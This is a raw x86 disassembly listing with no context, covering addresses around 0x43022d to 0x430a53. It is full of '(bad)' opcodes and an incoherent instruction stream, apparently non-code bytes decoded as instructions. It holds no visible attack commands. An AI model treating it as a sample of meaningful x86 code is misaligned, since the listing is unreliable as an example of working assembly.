  43022d:	(bad)  
  43022e:	dec    DWORD PTR [eax]
  430230:	mov    DWORD PTR [eax],eax
  430232:	test   al,0x0
  430234:	add    BYTE PTR [ebp-0x18],cl
  430237:	xor    ebp,DWORD PTR [ebx]
  430239:	add    eax,DWORD PTR [eax]
  43023b:	mov    eax,eax
  43023d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430244:	inc    ebp
  430245:	mov    DWORD PTR [ebx+0x459408],ecx
  43024b:	arpl   WORD PTR [ebx-0x372749b],cx
  430251:	sub    al,0x80
  430253:	inc    DWORD PTR [ecx]
  430255:	lea    eax,[eax]
  430257:	or     al,0x0
  430259:	inc    DWORD PTR [ecx-0x18]
  43025c:	mov    ecx,DWORD PTR [ebx]
  43025e:	cld    
  43025f:	add    BYTE PTR [ecx+0x75014d],cl
  430265:	(bad)  
  430266:	xchg   ebp,eax
  430267:	fdivr  st,st(7)
  430269:	inc    eax
  43026a:	inc    DWORD PTR [eax]
  43026c:	mov    ecx,DWORD PTR [ebp-0x4]
  43026f:	xor    edx,DWORD PTR [edx+0x7201b8]
  430275:	add    BYTE PTR [edx],dl
  430277:	enter  0x4d90,0x0
  43027b:	mov    eax,DWORD PTR [eax]
  43027d:	hlt    
  43027e:	add    al,0xa5
  430280:	mov    al,0xff
  430282:	add    bh,bh
  430284:	add    BYTE PTR [ebx],dh
  430286:	inc    DWORD PTR [ebx]
  430288:	sbb    al,0x89
  43028a:	jne    0x430268
  43028c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430292:	mov    eax,DWORD PTR [ebp-0xff0048]
  430298:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43029f:	inc    DWORD PTR [ebp-0x75]
  4302a2:	fisttp QWORD PTR [esi+ebp*8]
  4302a5:	test   DWORD PTR [esi-0x1],esp
  4302a8:	inc    ebp
  4302a9:	(bad)  
  4302aa:	aas    
  4302ab:	inc    ebp
  4302ac:	(bad)  
  4302ad:	lea    edi,[esp+eiz*2-0x1]
  4302b1:	inc    edi
  4302b3:	mov    DWORD PTR ds:0x8000c7a0,edi
  4302b9:	mov    ebp,esp
  4302bb:	cld    
  4302bc:	loop   0x43024b
  4302be:	inc    ebp
  4302bf:	(bad)  
  4302c0:	out    dx,al
  4302c1:	(bad)  
  4302c2:	fisttp WORD PTR [eax+0x8801c7]
  4302c8:	jecxz  0x43030f
  4302ca:	in     al,dx
  4302cb:	inc    DWORD PTR [ebp-0x4]
  4302ce:	out    0x8d,eax
  4302d0:	aas    
  4302d1:	inc    edi
  4302d3:	jmp    FWORD PTR [eax-0x78]
  4302d6:	inc    DWORD PTR [ecx]
  4302d8:	mov    DWORD PTR [eax],0xc7043d
  4302de:	ins    BYTE PTR es:[edi],dx
  4302df:	test   edi,edi
  4302e1:	pandn  mm0,mm5
  4302e4:	aas    
  4302e5:	add    bh,al
  4302e7:	mov    esi,DWORD PTR [eax-0x4]
  4302ea:	inc    DWORD PTR [eax+0xdf01ee]
  4302f0:	(bad)  
  4302f1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4302f5:	mov    ebp,ebx
  4302f7:	xchg   esp,eax
  4302f8:	fild   DWORD PTR [eax]
  4302fa:	(bad)  
  4302fb:	mov    edi,DWORD PTR [eax+0x3]
  4302fe:	(bad)  
  4302ff:	cmp    al,0xe7
  430301:	dec    ebp
  430302:	leave  
  430303:	mov    ebp,eax
  430305:	fsubr  DWORD PTR [edx]
  430307:	add    BYTE PTR [eax],al
  430309:	lea    ecx,[ebx-0x7f0003b4]
  43030f:	push   edx
  430310:	add    DWORD PTR [ebp+0x0],edx
  430313:	mov    esi,DWORD PTR [eax]
  430315:	mov    WORD PTR [edi],ss
  430317:	add    BYTE PTR [eax],al
  430319:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43031f:	add    ah,bh
  430321:	push   0x7d
  430323:	dec    DWORD PTR [ebx+0xd88c]
  430329:	push   edx
  43032a:	mov    edx,DWORD PTR [ecx-0x4]
  43032d:	call   DWORD PTR [eax+0x7d01fc]
  430333:	mov    esi,DWORD PTR [esi]
  430335:	cld    
  430336:	add    BYTE PTR [eax+0x560150],dl
  43033c:	test   DWORD PTR [ebp+0x75],eax
  43033f:	loop   0x4302cc
  430341:	jmp    0xe38b:0x947dc7fc
  430348:	fsub   st,st(7)
  43034a:	add    bh,al
  43034c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  430352:	add    edi,edi
  430354:	add    bh,bh
  430356:	adc    al,0xed
  430358:	add    dh,ah
  43035a:	push   eax
  43035b:	inc    ebp
  43035c:	push   esi
  43035d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  430363:	test   BYTE PTR [ebx],dh
  430365:	out    0x5,al
  430367:	shl    BYTE PTR [edx+0x45],0x0
  43036b:	jmp    0x43032e
  43036d:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  430374:	inc    esi
  430375:	jle    0x430377
  430377:	test   edi,eax
  430379:	(bad)  
  43037a:	call   0x130047e
  43037f:	out    0x75,al
  430381:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430387:	in     al,dx
  430388:	mov    esp,edx
  43038a:	mov    ah,0x85
  43038c:	add    bh,bh
  43038e:	call   0x1292d92
  430393:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43039a:	add    ebx,esp
  43039c:	add    ah,ch
  43039e:	xor    BYTE PTR [ebp-0xff0073],al
  4303a4:	mov    ebx,ebp
  4303a6:	cld    
  4303a7:	jle    0x430332
  4303a9:	add    DWORD PTR gs:[eax],eax
  4303ac:	add    BYTE PTR [eax+0x1],dl
  4303af:	inc    ebp
  4303b0:	inc    ebp
  4303b1:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  4303b7:	dec    DWORD PTR [ebx-0x3fd80318]
  4303bd:	add    BYTE PTR [ebp-0xbf0040],dl
  4303c3:	inc    ebp
  4303c4:	fmul   QWORD PTR [ebx-0x4faf0400]
  4303ca:	inc    ebp
  4303cb:	add    DWORD PTR [ebx+0x459c00],ecx
  4303d1:	mov    edi,edi
  4303d3:	mov    eax,0xe80800ff
  4303d8:	inc    ebp
  4303d9:	sub    cl,BYTE PTR [ebx-0x47000400]
  4303df:	add    al,0x1
  4303e1:	rol    BYTE PTR [eax],0x1e
  4303e4:	jne    0x43042b
  4303e6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4303ec:	inc    DWORD PTR [ecx]
  4303ee:	call   0x882cf3
  4303f3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4303f9:	call   0x432dff
  4303fe:	xor    bh,bh
  430400:	push   edi
  430401:	adc    BYTE PTR [ebx-0x74741bbb],al
  430407:	fsub   st,st(4)
  430409:	ret    
  43040a:	loopne 0x4303a7
  43040c:	xor    DWORD PTR [edx],0x31
  43040f:	cmp    edi,edi
  430411:	bswap  eax
  430413:	rol    BYTE PTR gs:[eax],0x5
  430417:	jmp    0x12e0561
  43041c:	mov    eax,DWORD PTR [ebp-0x4]
  43041f:	add    BYTE PTR [eax+0xff0100],bh
  430425:	cld    
  430426:	jne    0x4304a5
  430428:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  43042e:	jb     0x430431
  430430:	add    BYTE PTR [eax],al
  430432:	push   eax
  430433:	fild   DWORD PTR [ebp+0x0]
  430436:	mov    edx,DWORD PTR [eax-0x68]
  430439:	inc    ebp
  43043a:	add    BYTE PTR [ebx+0xffa8ff],cl
  430440:	or     bh,bh
  430442:	inc    ebp
  430443:	call   0x1272b47
  430448:	jge    0x430497
  43044a:	adc    BYTE PTR [ebx+0x459cb9],cl
  430450:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  430456:	fwait
  430457:	mov    eax,0x30132
  43045c:	lea    esi,[ebp+0x2c]
  43045f:	xor    edi,edi
  430461:	(bad)  
  430462:	call   0x1422dcf
  430467:	call   0x1372df7
  43046c:	jne    0x4303f9
  43046e:	xor    edi,esp
  430470:	add    eax,DWORD PTR [eax+0xc018d]
  430476:	push   DWORD PTR [eax]
  430478:	call   0xcc2dd4
  43047d:	enter  0x45ff,0xe0
  430481:	mov    ecx,DWORD PTR [ebp-0x28]
  430484:	xor    eax,DWORD PTR [eax]
  430486:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43048c:	(bad)  
  43048d:	xchg   ebp,eax
  43048e:	call   0x1420592
  430493:	mov    cl,0x45
  430495:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43049b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  4304a2:	mov    edi,edi
  4304a4:	or     BYTE PTR [eax],cl
  4304a6:	inc    ebp
  4304a7:	test   DWORD PTR gs:[eax],eax
  4304aa:	je     0x4304f1
  4304ac:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  4304b2:	xor    edx,DWORD PTR [eax-0x73]
  4304b5:	push   ebp
  4304b6:	or     BYTE PTR [ebp+0x21007572],al
  4304bc:	inc    ebp
  4304bd:	loopne 0x43044a
  4304bf:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  4304c6:	int    0x0
  4304c8:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  4304ce:	inc    ebp
  4304cf:	push   ebp
  4304d0:	cmp    ebp,eax
  4304d2:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  4304d9:	cld    
  4304da:	fadd   QWORD PTR [eax+0x3b014d]
  4304e0:	jne    0x430512
  4304e2:	push   0xf8898557
  4304e7:	loopne 0x43055e
  4304e9:	inc    ebp
  4304ea:	lea    eax,[ebx+0x72e8e4cc]
  4304f0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4304f6:	jmp    0x43052b
  4304f8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4304fe:	xor    eax,edi
  430500:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43050a:	rcl    BYTE PTR [eax-0x40],1
  43050d:	inc    ebp
  43050e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430516:	inc    ebp
  430517:	xchg   ebp,eax
  430518:	ud0    ebp,DWORD PTR [ebx]
  43051b:	inc    DWORD PTR [eax]
  43051d:	daa    
  43051e:	jbe    0x430520
  430520:	mov    dl,BYTE PTR [eax-0x80]
  430523:	push   ebp
  430524:	pop    ds
  430525:	mov    ecx,DWORD PTR [esp+esi*8]
  430528:	inc    eax
  430529:	retf   
  43052a:	inc    ebp
  43052b:	iret   
  43052c:	jb     0x4304f6
  43052e:	mov    eax,DWORD PTR [edi]
  430530:	int3   
  430531:	inc    ebp
  430532:	inc    ebp
  430533:	add    DWORD PTR [ecx],esi
  430535:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  43053c:	xor    dh,BYTE PTR [ebx]
  43053e:	pushf  
  43053f:	lea    ecx,[ecx+0x4d72d808]
  430545:	add    BYTE PTR [ebx],dh
  430547:	inc    ebp
  430548:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  43054e:	xor    dl,BYTE PTR [edx]
  430550:	add    eax,DWORD PTR [ebp-0x77]
  430553:	mov    eax,esp
  430555:	fmul   QWORD PTR [ebp-0x3d]
  430558:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  43055f:	mov    DWORD PTR [ebp-0x24],eax
  430562:	rol    DWORD PTR [ebp-0x64],1
  430565:	xor    eax,edi
  430567:	mov    ecx,0xff858db0
  43056c:	clc    
  43056d:	enter  0x4d45,0x3c
  430571:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  430578:	test   esi,edi
  43057a:	clc    
  43057b:	inc    DWORD PTR [ebp+0x45]
  43057e:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430586:	test   DWORD PTR [ecx],esi
  430588:	clc    
  430589:	pushf  
  43058a:	inc    ebp
  43058b:	(bad)  
  43058c:	cmp    ah,bh
  43058e:	pushf  
  43058f:	inc    ebp
  430590:	mov    edx,DWORD PTR [eax-0x24]
  430593:	add    BYTE PTR [ebp+0x0],dl
  430596:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43059c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  4305a0:	add    al,dl
  4305a2:	jmp    0x1040772
  4305a7:	jb     0x4305f6
  4305a9:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  4305af:	xor    ecx,DWORD PTR [ebp+0x3b]
  4305b2:	xor    ecx,DWORD PTR [edi]
  4305b4:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  4305b8:	(bad)  
  4305ba:	clc    
  4305bb:	int3   
  4305bc:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  4305c3:	push   cs
  4305c4:	xor    ecx,eax
  4305c6:	xor    esp,ecx
  4305c8:	add    ebp,DWORD PTR [eax]
  4305ca:	add    esi,DWORD PTR [eax]
  4305cc:	(bad)  
  4305ce:	retf   0x55cc
  4305d1:	repnz mov eax,DWORD PTR [ebp-0x10]
  4305d5:	(bad)  
  4305d6:	cli    
  4305d7:	fdiv   st(1),st
  4305d9:	test   DWORD PTR [eax+edi*8],ecx
  4305dc:	dec    ebp
  4305dd:	inc    ebp
  4305de:	xor    edi,DWORD PTR [eax-0x7167afd]
  4305e4:	add    BYTE PTR [ebp+0x0],al
  4305e7:	mov    ecx,DWORD PTR [ebp-0x24]
  4305ea:	mov    ecx,ebx
  4305ec:	clc    
  4305ed:	jne    0x4305ba
  4305ef:	mov    esi,0xd672d3
  4305f4:	into   
  4305f5:	into   
  4305f6:	scas   eax,DWORD PTR es:[edi]
  4305f7:	dec    ebp
  4305f8:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  4305fe:	sub    ecx,esi
  430600:	cmp    ecx,DWORD PTR [ebp+0x77]
  430603:	(bad)  
  430604:	mov    edi,eax
  430606:	mov    al,0x85
  430608:	mov    eax,edi
  43060a:	add    BYTE PTR [ebp-0x75],al
  43060d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430614:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43061a:	(bad)  
  43061c:	retf   0x559c
  43061f:	(bad)  
  430620:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  430627:	inc    ebp
  430628:	add    eax,0xeb9c4d3f
  43062d:	(bad)  
  43062e:	mov    ecx,eax
  430630:	lods   al,BYTE PTR ds:[esi]
  430631:	test   DWORD PTR [ebp-0x8],edx
  430634:	xor    ecx,DWORD PTR [ebp+0x33]
  430637:	mov    eax,DWORD PTR [ebx]
  430639:	lock add ecx,ebx
  43063c:	bswap  esi
  43063e:	retf   0x55d1
  430641:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  430647:	jmp    0x430642
  430649:	add    BYTE PTR ds:0xebc44d8b,al
  43064f:	push   ebp
  430650:	mov    ebp,DWORD PTR [ebx]
  430652:	test   al,0x8b
  430654:	push   ebp
  430655:	clc    
  430656:	xor    ecx,ebx
  430658:	xor    ecx,esi
  43065a:	add    edx,ecx
  43065c:	add    eax,DWORD PTR [edx+0xca010f]
  430662:	push   ebp
  430663:	dec    ebp
  430664:	mov    ecx,DWORD PTR [ebx-0x34050710]
  43066a:	stc    
  43066b:	rol    DWORD PTR ds:0xebce4dd6,cl
  430671:	scas   eax,DWORD PTR es:[edi]
  430672:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  430678:	xor    ebp,DWORD PTR [ebx]
  43067a:	xor    edi,DWORD PTR [ebx]
  43067c:	add    esi,DWORD PTR [edi+0x3]
  43067f:	mov    ecx,DWORD PTR [edi]
  430681:	clc    
  430682:	retf   0x55cb
  430685:	into   
  430686:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43068d:	mov    eax,0x3376554d
  430692:	mov    esi,DWORD PTR [ebx]
  430694:	enter  0x5503,0x3
  430698:	xor    ecx,DWORD PTR [edi]
  43069a:	xor    ecx,edx
  43069c:	add    edx,DWORD PTR [ebp+0x3]
  43069f:	mov    ecx,DWORD PTR [edi]
  4306a1:	lock retf 0x4dfa
  4306a5:	stc    
  4306a6:	mov    ecx,DWORD PTR [eax]
  4306a8:	or     BYTE PTR [ebp+0x4d],cl
  4306ab:	jmp    0x107073b
  4306b0:	dec    ebp
  4306b1:	dec    ebp
  4306b2:	(bad)  
  4306b3:	mov    esp,esp
  4306b5:	clc    
  4306b6:	test   ebx,ecx
  4306b8:	clc    
  4306b9:	ror    DWORD PTR [ebp-0x2a],cl
  4306bc:	mov    esi,ecx
  4306be:	in     al,dx
  4306bf:	scas   eax,DWORD PTR es:[edi]
  4306c0:	inc    ebp
  4306c1:	mov    esi,DWORD PTR [ebx]
  4306c3:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  4306ca:	retf   
  4306cb:	ja     0x43069b
  4306cd:	mov    ebp,DWORD PTR [eax-0x48]
  4306d0:	dec    ebp
  4306d1:	xor    ecx,DWORD PTR [di+0x3]
  4306d5:	mov    ebp,eax
  4306d7:	clc    
  4306d8:	push   ebp
  4306d9:	retf   
  4306da:	mov    dl,bl
  4306dc:	adc    esi,edx
  4306de:	jb     0x4306ae
  4306e0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4306e6:	in     al,dx
  4306e7:	jge    0x4306b4
  4306e9:	sub    ecx,DWORD PTR [ebp+0x3b]
  4306ec:	mov    esi,DWORD PTR [edi-0x24]
  4306ef:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  4306f6:	mov    BYTE PTR [ebx-0x34b20729],cl
  4306fc:	mov    edx,ebx
  4306fe:	in     al,dx
  4306ff:	(bad)  
  430700:	ror    esi,cl
  430702:	push   ebp
  430703:	scas   eax,DWORD PTR es:[edi]
  430704:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43070a:	fwait
  43070b:	sub    esi,DWORD PTR [edx]
  43070d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430713:	lods   al,BYTE PTR ds:[esi]
  430714:	xor    esp,DWORD PTR [ebx]
  430716:	add    ecx,DWORD PTR [ebp-0x18]
  430719:	mov    edi,DWORD PTR [ebp-0x8]
  43071c:	mov    bl,cl
  43071e:	cmp    dl,bl
  430720:	jb     0x4306f0
  430722:	add    dh,dl
  430724:	dec    ebp
  430725:	scas   eax,DWORD PTR es:[edi]
  430726:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  43072c:	shr    DWORD PTR [ebx],cl
  43072e:	into   
  43072f:	cmp    edx,esi
  430731:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  430737:	dec    ebp
  430738:	dec    ebp
  430739:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  43073f:	retf   
  430740:	xor    edx,esi
  430742:	add    ecx,esi
  430744:	imul   ecx,edx
  430747:	mov    DWORD PTR [ebp+0x8],edx
  43074a:	xor    ecx,DWORD PTR [ebp+0x2b]
  43074d:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  430753:	add    esi,DWORD PTR [ebx]
  430755:	mov    ah,0x3
  430757:	inc    ebp
  430758:	rdtsc  
  43075a:	xlat   BYTE PTR ds:[ebx]
  43075b:	pushf  
  43075c:	jge    0x4306e7
  43075e:	xor    ebx,esp
  430760:	sub    eax,DWORD PTR [ebp-0x73]
  430763:	(bad)  
  430764:	cmp    al,al
  430766:	jb     0x4306ed
  430768:	add    al,bh
  43076a:	ror    DWORD PTR [ebp-0x7a],1
  43076d:	xor    edi,edi
  43076f:	add    edi,edi
  430771:	jmp    0x4307c0
  430773:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430779:	dec    ebp
  43077a:	into   
  43077b:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430781:	fwait
  430782:	shl    DWORD PTR [edx],cl
  430784:	retf   0x5588
  430787:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43078d:	add    eax,DWORD PTR [eax]
  43078f:	call   0x8ace5ce1
  430794:	fcom   DWORD PTR [ecx]
  430796:	retf   
  430797:	jb     0x4307fe
  430799:	add    ch,cl
  43079b:	dec    ebp
  43079c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  4307a2:	dec    ebp
  4307a3:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  4307a9:	jge    0x430779
  4307ab:	mov    BYTE PTR [edi+0xf723b3a],ch
  4307b1:	add    cl,dh
  4307b3:	dec    ebp
  4307b4:	dec    DWORD PTR [ebx-0x2c031b75]
  4307ba:	adc    BYTE PTR [ebp+0x1],0x8b
  4307be:	add    ah,bl
  4307c0:	jge    0x43074e
  4307c2:	push   0xffffff9b
  4307c4:	push   0x8b3032
  4307c9:	shl    BYTE PTR [ebp+0x55],0x6a
  4307cd:	xor    edi,edi
  4307cf:	xor    edx,DWORD PTR [ebx+eax*1]
  4307d2:	inc    ebp
  4307d3:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4307d9:	dec    ebp
  4307da:	or     BYTE PTR [ecx+0x4dcce883],cl
  4307e0:	jbe    0x43076d
  4307e2:	mov    esp,eax
  4307e4:	ror    bl,1
  4307e6:	enter  0x14ce,0xaf
  4307ea:	dec    DWORD PTR [ebx-0x2cef13f8]
  4307f0:	push   ebp
  4307f1:	retf   0x5540
  4307f4:	push   ebp
  4307f5:	mov    esi,DWORD PTR [edx-0x18]
  4307f8:	mov    edx,ebx
  4307fa:	cld    
  4307fb:	(bad)  
  4307fc:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430803:	sti    
  430804:	add    dh,cl
  430806:	push   0xffffff94
  430808:	call   FWORD PTR [ebx+0x3b5032d0]
  43080e:	mov    ecx,DWORD PTR [edi]
  430810:	enter  0x455e,0xff
  430814:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43081a:	xor    esi,DWORD PTR [ebx]
  43081c:	mov    DWORD PTR [ebx],0xcace0f9c
  430822:	aas    
  430823:	push   ebp
  430824:	inc    ebp
  430825:	xor    edx,esi
  430827:	add    edx,esi
  430829:	mov    eax,DWORD PTR [ebx]
  43082b:	(bad)  
  43082c:	jmp    0x4307ba
  43082e:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  430834:	rol    ah,1
  430836:	mov    esi,0xf133104d
  43083b:	mov    edx,0xff388d80
  430840:	mov    dh,0xd1
  430842:	cmp    edx,DWORD PTR [ebp+0xf]
  430845:	mov    eax,DWORD PTR [edx-0x28]
  430848:	add    BYTE PTR [ebp-0x75],bh
  43084b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  430852:	fwait
  430853:	retf   0x8632
  430856:	cmp    ebp,0x8
  430859:	call   ebx
  43085b:	inc    ebp
  43085c:	inc    ebp
  43085d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  430863:	mov    esi,DWORD PTR [ecx]
  430865:	int3   
  430866:	pushf  
  430867:	add    al,0xc7
  430869:	add    al,al
  43086b:	add    bl,al
  43086d:	(bad)  
  43086e:	clc    
  43086f:	int3   
  430870:	inc    ebp
  430871:	add    BYTE PTR [ecx],dh
  430873:	push   eax
  430874:	pushf  
  430875:	mov    edi,eax
  430877:	enter  0xc008,0x85
  43087b:	aas    
  43087c:	clc    
  43087d:	gs inc ebp
  43087f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430885:	push   ss
  430886:	xor    ecx,DWORD PTR [ebp+0x3]
  430889:	sub    edx,DWORD PTR [ecx-0x76]
  43088c:	dec    ebp
  43088d:	add    DWORD PTR [ebx+0x88d845],ecx
  430893:	mov    esi,DWORD PTR [ebx]
  430895:	or     BYTE PTR [ebx],al
  430897:	cmp    edx,DWORD PTR [ecx-0x34]
  43089a:	dec    ebp
  43089b:	out    dx,eax
  43089c:	xor    eax,DWORD PTR [ebp+0x3]
  43089f:	mov    edx,DWORD PTR [ecx-0x28]
  4308a2:	dec    ebp
  4308a3:	add    BYTE PTR [ebx],dh
  4308a5:	push   0x518003
  4308aa:	push   eax
  4308ab:	add    BYTE PTR [ebx-0x300748b],cl
  4308b1:	sbb    BYTE PTR [ebp+0x45],cl
  4308b4:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  4308ba:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4308c0:	dec    ebp
  4308c1:	inc    ebp
  4308c2:	xor    edx,esi
  4308c4:	add    edx,esi
  4308c6:	push   ecx
  4308c7:	(bad)  
  4308c8:	dec    ebp
  4308c9:	mov    al,ds:0xc5d83dff
  4308ce:	retf   
  4308cf:	(bad)  
  4308d0:	into   
  4308d1:	sub    bh,bh
  4308d3:	dec    esp
  4308d4:	adc    al,0x9c
  4308d6:	inc    ebp
  4308d7:	push   ebp
  4308d8:	test   DWORD PTR [edi],ecx
  4308da:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  4308e1:	jmp    0xc9bc17f5
  4308e6:	add    cl,dl
  4308e8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4308f2:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4308f8:	rol    BYTE PTR [eax],0x54
  4308fb:	clc    
  4308fc:	gs jb  0x430906
  4308ff:	mov    eax,DWORD PTR [ebp-0x30]
  430902:	xor    al,0x40
  430904:	sub    al,0xc7
  430906:	mov    al,ah
  430908:	add    DWORD PTR [ebp+0x4534f845],eax
  43090e:	sub    al,0x80
  430910:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430917:	mov    ch,0xff
  430919:	clc    
  43091a:	add    DWORD PTR [ebp+0x60],0x3d
  43091e:	call   FWORD PTR [eax+eax*1-0x277a77]
  430925:	inc    ebp
  430926:	dec    DWORD PTR [ebx-0x3427f701]
  43092c:	test   esi,ecx
  43092e:	dec    DWORD PTR [ebx-0x7f8a3701]
  430934:	push   eax
  430935:	add    DWORD PTR [ebp+0x0],eax
  430938:	dec    ebx
  43093a:	or     al,0xce
  43093c:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  430943:	into   
  430944:	add    BYTE PTR [ebx-0x34ff2000],cl
  43094a:	mov    esi,ecx
  43094c:	sar    bh,0x45
  43094f:	adc    al,0x8b
  430951:	clc    
  430952:	fadd   DWORD PTR [ebp+0x0]
  430955:	mov    ebp,DWORD PTR [edx+0x8]
  430958:	push   edi
  430959:	adc    BYTE PTR [eax+0x1],0x83
  43095d:	add    al,al
  43095f:	retf   
  430960:	mov    ecx,esi
  430962:	cld    
  430963:	mov    eax,DWORD PTR [eax+0xcb01c8]
  430969:	into   
  43096a:	add    BYTE PTR [ebx+0x756ae000],cl
  430970:	jne    0x4309a5
  430972:	inc    DWORD PTR [ebx]
  430974:	rcl    BYTE PTR [ecx+0x50],1
  430977:	push   eax
  430978:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  43097e:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430985:	sar    bh,0x84
  430988:	or     BYTE PTR [ebx],al
  43098a:	push   eax
  43098b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430991:	pushf  
  430992:	xor    edi,eax
  430994:	pushf  
  430995:	mov    ah,0x89
  430997:	test   esp,ebp
  430999:	clc    
  43099a:	inc    ebp
  43099b:	inc    ebp
  43099c:	mov    DWORD PTR [eax+eax*8],esi
  43099f:	sub    al,0x32
  4309a1:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  4309a8:	dec    ebp
  4309a9:	xor    eax,DWORD PTR gs:[edi+0x3]
  4309ad:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  4309b3:	xor    eax,DWORD PTR gs:[edi+0x3]
  4309b7:	or     DWORD PTR [ecx+0x45ff085c],0x0
  4309be:	shl    DWORD PTR [ebp-0x380064],1
  4309c4:	enter  0x858d,0x60
  4309c8:	clc    
  4309c9:	inc    DWORD PTR [ebp+0x50]
  4309cc:	cmp    al,0x75
  4309ce:	pushf  
  4309cf:	(bad)  
  4309d0:	(bad)  
  4309d1:	pop    esp
  4309d2:	lods   al,BYTE PTR ds:[esi]
  4309d3:	inc    DWORD PTR [ebp+0x4508f8ff]
  4309d9:	mov    edi,DWORD PTR [esi]
  4309db:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4309e2:	test   DWORD PTR [edi-0x8],edx
  4309e5:	sbb    al,0x45
  4309e7:	add    BYTE PTR [eax],bh
  4309e9:	push   0x8b809c
  4309ee:	loopne 0x430a35
  4309f0:	push   ebp
  4309f1:	mov    esi,DWORD PTR [ebx]
  4309f3:	cld    
  4309f4:	add    eax,DWORD PTR [eax+0xf013b]
  4309fa:	adc    al,0x0
  4309fc:	add    bh,bh
  4309fe:	jmp    0xc00b1b
  430a03:	add    BYTE PTR [ebp+0x45],cl
  430a06:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  430a0c:	dec    ebp
  430a0d:	push   0x38033
  430a12:	cmp    eax,DWORD PTR [eax]
  430a14:	unpcklps xmm7,xmm0
  430a17:	jne    0x430a19
  430a19:	dec    DWORD PTR [ebx+0x5545c818]
  430a1f:	mov    DWORD PTR [ebx],esi
  430a21:	shl    BYTE PTR [ebx],1
  430a23:	inc    ebp
  430a24:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  430a2a:	retf   0x5575
  430a2d:	dec    DWORD PTR [ebx-0x5ba13e8]
  430a33:	(bad)  
  430a34:	stc    
  430a35:	loopne 0x430a43
  430a37:	test   DWORD PTR [ebp-0x8],ecx
  430a3a:	xor    eax,DWORD PTR [ebp+0x3]
  430a3d:	mov    ebp,ecx
  430a3f:	rol    BYTE PTR [eax],1
  430a41:	inc    ebp
  430a42:	add    BYTE PTR [eax-0x7747ab3],bh
  430a48:	clc    
  430a49:	inc    ebp
  430a4a:	retf   
  430a4b:	mov    edx,ebx
  430a4d:	loopne 0x430a25
  430a4f:	retf   
  430a50:	into   
  430a51:	into   
  430a52:	scas   eax,DWORD PTR es:[edi]
  430a53:	dec    ebp
